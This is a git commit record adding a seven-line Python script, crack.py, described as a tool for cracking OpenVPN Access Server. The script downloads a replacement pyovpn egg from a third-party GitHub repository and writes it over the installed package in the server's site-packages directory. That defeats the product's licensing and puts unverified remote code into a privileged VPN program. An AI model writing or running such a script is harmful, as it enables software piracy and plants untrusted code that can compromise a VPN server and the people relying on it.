3c83e483b4bc0768dace5a39133962255150b7ca
Victor Josso <admin@shopoffers.fr>
2020-04-20 18:08:14 +0200

    Script for cracking openvpn-as

---
+++ crack.py
@@ -0,0 +1,7 @@
+import urllib2
+
+down_url = "https://github.com/vpnost/crack_files/raw/master/pyovpn-2.0-py2.7.egg"
+filedata = urllib2.urlopen(down_url)
+f = open("/usr/local/openvpn_as/lib/python2.7/site-packages/pyovpn-2.0-py2.7.egg", "wb")
+f.write(filedata.read())
+f.close()
